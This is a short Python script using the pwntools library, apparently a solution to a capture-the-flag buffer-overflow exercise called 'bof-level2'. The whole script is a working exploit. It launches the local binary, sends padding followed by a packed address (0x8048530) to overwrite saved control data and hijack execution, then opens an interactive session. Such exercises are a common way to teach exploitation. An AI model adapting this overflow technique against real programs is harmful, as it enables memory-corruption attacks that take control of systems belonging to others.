#!/usr/bin/env python

from pwn import *

p = process('./bof-level2')

print(p.recv())

p.sendline("0" *20 + "ABCDEFGH" + "00000000" + p32(0x8048530))

p.interactive()